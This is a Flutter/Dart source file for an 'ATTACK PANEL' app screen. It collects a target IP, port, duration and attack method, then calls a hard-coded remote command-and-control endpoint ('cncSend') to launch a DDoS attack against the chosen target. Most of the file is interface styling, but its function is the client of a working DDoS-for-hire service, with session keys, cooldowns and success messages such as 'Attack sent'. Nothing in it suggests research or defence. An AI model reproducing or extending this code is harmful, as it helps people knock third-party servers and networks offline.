// lib/ddos_panel.dart
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;

import 'theme.dart';

const String kFontFamily = 'Ganang';

class AttackPanel extends StatefulWidget {
  final String sessionKey;
  final List<Map<String, dynamic>> listDoos;

  const AttackPanel({
    super.key,
    required this.sessionKey,
    required this.listDoos,
  });

  @override
  State<AttackPanel> createState() => _AttackPanelState();
}

class _AttackPanelState extends State<AttackPanel>
    with TickerProviderStateMixin {
  final targetController = TextEditingController();
  final portController = TextEditingController();
  final String baseUrl = "http://console.jhonaleystore.id:2870";
  late AnimationController _controller;
  String selectedDoosId = "";
  double attackDuration = 60;
  bool _isSending = false;

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);

    if (widget.listDoos.isNotEmpty) {
      selectedDoosId = widget.listDoos[0]['ddos_id'];
    }
  }

  Future<void> _sendDoos() async {
    final target = targetController.text.trim();
    final port = portController.text.trim();
    final key = widget.sessionKey;
    final int duration = attackDuration.toInt();

    if (target.isEmpty || key.isEmpty) {
      HapticFeedback.vibrate();
      _showAlert(
        isError: true,
        title: "INVALID INPUT",
        message: "Target IP cannot be empty.",
      );
      return;
    }

    if (selectedDoosId != "icmp" &&
        (port.isEmpty || int.tryParse(port) == null)) {
      HapticFeedback.vibrate();
      _showAlert(
        isError: true,
        title: "INVALID PORT",
        message: "Please input a valid port.",
      );
      return;
    }

    HapticFeedback.mediumImpact();
    setState(() => _isSending = true);

    try {
      final uri = Uri.parse(
          "$baseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId&port=${port.isEmpty ? 0 : port}&duration=$duration");
      final res = await http.get(uri).timeout(const Duration(seconds: 30));
      final data = jsonDecode(res.body);

      if (!mounted) return;

      if (data["cooldown"] == true) {
        _showAlert(
          isError: false,
          title: "COOLDOWN",
          message: "Please wait a moment before sending again.",
        );
      } else if (data["valid"] == false) {
        _showAlert(
          isError: true,
          title: "INVALID KEY",
          message: "Your session key is invalid. Please log in again.",
        );
      } else if (data["sended"] == false) {
        _showAlert(
          isError: false,
          title: "FAILED",
          message: "Failed to send attack. The server may be under maintenance.",
        );
      } else {
        HapticFeedback.heavyImpact();
        _showAlert(
          isError: false,
          isSuccess: true,
          title: "SUCCESS",
          message: "Attack sent to $target.",
        );
      }
    } catch (_) {
      if (!mounted) return;
      _showAlert(
        isError: true,
        title: "ERROR",
        message: "Unexpected error. Please try again.",
      );
    } finally {
      if (mounted) setState(() => _isSending = false);
    }
  }

  void _showAlert({
    required String title,
    required String message,
    required bool isError,
    bool isSuccess = false,
  }) {
    final p = context.theme;
    final color = isSuccess
        ? p.success
        : isError
            ? p.danger
            : const Color(0xFFFFC107);

    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.75),
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        elevation: 0,
        child: Container(
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(
            color: p.surfaceAlt,
            border: Border.all(
              color: Colors.white.withOpacity(0.7),
              width: 1.5,
            ),
            boxShadow: [
              BoxShadow(
                color: Colors.black.withOpacity(0.8),
                offset: const Offset(5, 5),
                blurRadius: 0,
              ),
            ],
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(
                children: [
                  Container(
                    padding: const EdgeInsets.all(10),
                    decoration: BoxDecoration(
                      color: color.withOpacity(0.15),
                      border: Border.all(
                        color: color.withOpacity(0.6),
                        width: 1.5,
                      ),
                    ),
                    child: Icon(
                      isSuccess
                          ? Icons.check_circle
                          : isError
                              ? Icons.error_outline
                              : Icons.warning_amber,
                      color: color,
                      size: 22,
                    ),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Text(
                      title,
                      style: TextStyle(
                        color: p.textPrimary,
                        fontFamily: kFontFamily,
                        fontSize: 14,
                        fontWeight: FontWeight.w900,
                        letterSpacing: 1.2,
                      ),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 16),
              Text(
                message,
                style: TextStyle(
                  color: p.textSecondary,
                  fontFamily: kFontFamily,
                  fontSize: 12,
                  height: 1.5,
                ),
              ),
              const SizedBox(height: 20),
              SizedBox(
                width: double.infinity,
                child: TextButton(
                  onPressed: () => Navigator.pop(context),
                  style: TextButton.styleFrom(
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    backgroundColor: p.textPrimary,
                    shape: const RoundedRectangleBorder(
                      borderRadius: BorderRadius.zero,
                    ),
                  ),
                  child: Text(
                    "OK",
                    style: TextStyle(
                      color: p.bg,
                      fontFamily: kFontFamily,
                      fontSize: 13,
                      fontWeight: FontWeight.w900,
                      letterSpacing: 2.0,
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  @override
  void dispose() {
    _controller.dispose();
    targetController.dispose();
    portController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final p = context.theme;
    final isIcmp = selectedDoosId.toLowerCase() == "icmp";

    return Scaffold(
      backgroundColor: p.bg,
      extendBodyBehindAppBar: true,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        centerTitle: true,
        iconTheme: IconThemeData(color: p.textPrimary),
        title: Container(
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 6),
          decoration: BoxDecoration(
            color: p.primary,
            boxShadow: [
              BoxShadow(
                color: Colors.white.withOpacity(0.25),
                blurRadius: 14,
              ),
            ],
          ),
          child: Text(
            "ATTACK PANEL",
            style: TextStyle(
              fontFamily: kFontFamily,
              fontSize: 13,
              fontWeight: FontWeight.w900,
              color: p.onPrimary,
              letterSpacing: 2.0,
            ),
          ),
        ),
      ),
      body: Stack(
        fit: StackFit.expand,
        children: [
          _buildBackground(p),
          SafeArea(
            child: SingleChildScrollView(
              physics: const BouncingScrollPhysics(),
              padding: const EdgeInsets.fromLTRB(16, 20, 16, 40),
              child: Column(
                children: [
                  // ── ANIMATED LOGO ──
                  FadeTransition(
                    opacity: Tween(begin: 0.5, end: 1.0).animate(_controller),
                    child: Container(
                      width: 100,
                      height: 100,
                      decoration: BoxDecoration(
                        color: p.surfaceAlt,
                        border: Border.all(
                          color: Colors.white.withOpacity(0.7),
                          width: 1.5,
                        ),
                        boxShadow: [
                          BoxShadow(
                            color: Colors.black.withOpacity(0.8),
                            offset: const Offset(4, 4),
                            blurRadius: 0,
                          ),
                        ],
                      ),
                      child: ClipRect(
                        child: Image.asset(
                          'assets/images/logo.png',
                          fit: BoxFit.cover,
                          errorBuilder: (_, __, ___) => Icon(
                            Icons.bolt,
                            color: p.textPrimary,
                            size: 40,
                          ),
                        ),
                      ),
                    ),
                  ),
                  const SizedBox(height: 20),

                  // ── TITLE ──
                  Text(
                    "TARGET & METHOD",
                    style: TextStyle(
                      color: p.textPrimary,
                      fontFamily: kFontFamily,
                      fontSize: 13,
                      fontWeight: FontWeight.w900,
                      letterSpacing: 2.0,
                    ),
                  ),
                  const SizedBox(height: 6),
                  Container(
                    width: 40,
                    height: 2,
                    color: p.textPrimary,
                  ),
                  const SizedBox(height: 24),

                  // ── TARGET INPUT ──
                  _buildInputCard(
                    p: p,
                    icon: Icons.computer,
                    title: "TARGET IP",
                    child: TextField(
                      controller: targetController,
                      style: TextStyle(
                        color: p.textPrimary,
                        fontFamily: kFontFamily,
                        fontSize: 14,
                        fontWeight: FontWeight.w600,
                      ),
                      cursorColor: p.textPrimary,
                      decoration: _inputStyle(p, "e.g. 1.1.1.1"),
                    ),
                  ),
                  const SizedBox(height: 14),

                  // ── PORT INPUT ──
                  _buildInputCard(
                    p: p,
                    icon: Icons.wifi_tethering,
                    title: "PORT",
                    child: TextField(
                      controller: portController,
                      enabled: !isIcmp,
                      keyboardType: TextInputType.number,
                      style: TextStyle(
                        color: isIcmp ? p.textMuted : p.textPrimary,
                        fontFamily: kFontFamily,
                        fontSize: 14,
                        fontWeight: FontWeight.w600,
                      ),
                      cursorColor: isIcmp ? p.textMuted : p.textPrimary,
                      decoration: _inputStyle(
                        p,
                        isIcmp ? "ICMP does not use port" : "e.g. 80",
                        disabled: isIcmp,
                      ),
                    ),
                  ),
                  const SizedBox(height: 14),

                  // ── DURATION SLIDER ──
                  _buildInputCard(
                    p: p,
                    icon: Icons.timer_outlined,
                    title: "DURATION",
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Row(
                          children: [
                            Text(
                              "${attackDuration.toInt()}",
                              style: TextStyle(
                                color: p.textPrimary,
                                fontFamily: kFontFamily,
                                fontSize: 22,
                                fontWeight: FontWeight.w900,
                              ),
                            ),
                            const SizedBox(width: 4),
                            Text(
                              "SECONDS",
                              style: TextStyle(
                                color: p.textTertiary,
                                fontFamily: kFontFamily,
                                fontSize: 11,
                                fontWeight: FontWeight.w800,
                                letterSpacing: 1.2,
                              ),
                            ),
                          ],
                        ),
                        const SizedBox(height: 8),
                        SliderTheme(
                          data: SliderTheme.of(context).copyWith(
                            activeTrackColor: p.textPrimary,
                            inactiveTrackColor: p.textPrimary.withOpacity(0.15),
                            thumbColor: p.textPrimary,
                            overlayColor: p.textPrimary.withOpacity(0.2),
                            trackHeight: 3,
                          ),
                          child: Slider(
                            value: attackDuration,
                            min: 10,
                            max: 300,
                            divisions: 29,
                            label: "${attackDuration.toInt()}s",
                            onChanged: (value) {
                              setState(() => attackDuration = value);
                            },
                          ),
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(height: 14),

                  // ── METHOD DROPDOWN ──
                  _buildInputCard(
                    p: p,
                    icon: Icons.flash_on,
                    title: "ATTACK METHOD",
                    child: DropdownButtonHideUnderline(
                      child: DropdownButton<String>(
                        dropdownColor: p.surfaceAlt,
                        value: selectedDoosId.isNotEmpty ? selectedDoosId : null,
                        isExpanded: true,
                        iconEnabledColor: p.textTertiary,
                        style: TextStyle(
                          color: p.textPrimary,
                          fontFamily: kFontFamily,
                          fontSize: 14,
                          fontWeight: FontWeight.w600,
                        ),
                        items: widget.listDoos.map((doos) {
                          return DropdownMenuItem<String>(
                            value: doos['ddos_id'],
                            child: Text(
                              doos['ddos_name'] ?? '-',
                              style: TextStyle(
                                color: p.textPrimary,
                                fontFamily: kFontFamily,
                                fontSize: 14,
                                fontWeight: FontWeight.w600,
                              ),
                            ),
                          );
                        }).toList(),
                        onChanged: (value) {
                          if (value == null) return;
                          setState(() => selectedDoosId = value);
                        },
                      ),
                    ),
                  ),
                  const SizedBox(height: 28),

                  // ── LAUNCH BUTTON ──
                  GestureDetector(
                    onTap: _isSending ? null : _sendDoos,
                    child: Container(
                      height: 58,
                      decoration: BoxDecoration(
                        color: _isSending ? p.surfaceAlt : p.textPrimary,
                        border: Border.all(
                          color: _isSending
                              ? Colors.white.withOpacity(0.7)
                              : p.textPrimary,
                          width: 1.5,
                        ),
                        boxShadow: _isSending
                            ? null
                            : [
                                BoxShadow(
                                  color: Colors.black.withOpacity(0.8),
                                  offset: const Offset(5, 5),
                                  blurRadius: 0,
                                ),
                              ],
                      ),
                      child: Center(
                        child: _isSending
                            ? Row(
                                mainAxisAlignment: MainAxisAlignment.center,
                                children: [
                                  SizedBox(
                                    width: 20,
                                    height: 20,
                                    child: CircularProgressIndicator(
                                      color: p.textMuted,
                                      strokeWidth: 2.5,
                                    ),
                                  ),
                                  const SizedBox(width: 12),
                                  Text(
                                    "LAUNCHING...",
                                    style: TextStyle(
                                      fontSize: 14,
                                      fontFamily: kFontFamily,
                                      fontWeight: FontWeight.w900,
                                      letterSpacing: 1.5,
                                      color: p.textMuted,
                                    ),
                                  ),
                                ],
                              )
                            : Row(
                                mainAxisAlignment: MainAxisAlignment.center,
                                children: [
                                  Icon(Icons.bolt, color: p.bg, size: 22),
                                  const SizedBox(width: 10),
                                  Text(
                                    "LAUNCH ATTACK",
                                    style: TextStyle(
                                      fontSize: 14,
                                      fontFamily: kFontFamily,
                                      fontWeight: FontWeight.w900,
                                      letterSpacing: 1.5,
                                      color: p.bg,
                                    ),
                                  ),
                                ],
                              ),
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildBackground(AppPalette p) {
    return Stack(
      fit: StackFit.expand,
      children: [
        Container(color: p.bg),
        CustomPaint(
          painter: _GridPainter(color: Colors.white.withOpacity(0.03)),
        ),
        Container(
          decoration: BoxDecoration(
            gradient: RadialGradient(
              center: const Alignment(0, -0.6),
              radius: 0.9,
              colors: [
                Colors.white.withOpacity(0.04),
                Colors.transparent,
              ],
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildInputCard({
    required AppPalette p,
    required IconData icon,
    required String title,
    required Widget child,
  }) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: p.surfaceAlt,
        border: Border.all(
          color: Colors.white.withOpacity(0.7),
          width: 1.5,
        ),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.8),
            offset: const Offset(4, 4),
            blurRadius: 0,
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(
                  color: p.bg,
                  border: Border.all(
                    color: Colors.white.withOpacity(0.7),
                    width: 1.5,
                  ),
                ),
                child: Icon(icon, color: p.textPrimary, size: 14),
              ),
              const SizedBox(width: 10),
              Text(
                title,
                style: TextStyle(
                  color: p.textPrimary,
                  fontFamily: kFontFamily,
                  fontSize: 11,
                  fontWeight: FontWeight.w900,
                  letterSpacing: 1.5,
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          child,
        ],
      ),
    );
  }

  InputDecoration _inputStyle(
    AppPalette p,
    String hint, {
    bool disabled = false,
  }) {
    return InputDecoration(
      hintText: hint,
      hintStyle: TextStyle(
        color: disabled ? p.textMuted : p.textMuted,
        fontFamily: kFontFamily,
        fontSize: 13,
      ),
      filled: true,
      fillColor: p.bg,
      contentPadding: const EdgeInsets.symmetric(
        horizontal: 14,
        vertical: 14,
      ),
      border: InputBorder.none,
      enabledBorder: InputBorder.none,
      focusedBorder: InputBorder.none,
      disabledBorder: InputBorder.none,
    );
  }
}

// ============================================================
// GRID PAINTER
// ============================================================
class _GridPainter extends CustomPainter {
  final Color color;
  _GridPainter({required this.color});

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = color
      ..strokeWidth = 1;
    const s = 40.0;
    for (double x = 0; x < size.width; x += s) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    for (double y = 0; y < size.height; y += s) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }

  @override
  bool shouldRepaint(covariant _GridPainter old) => old.color != color;
}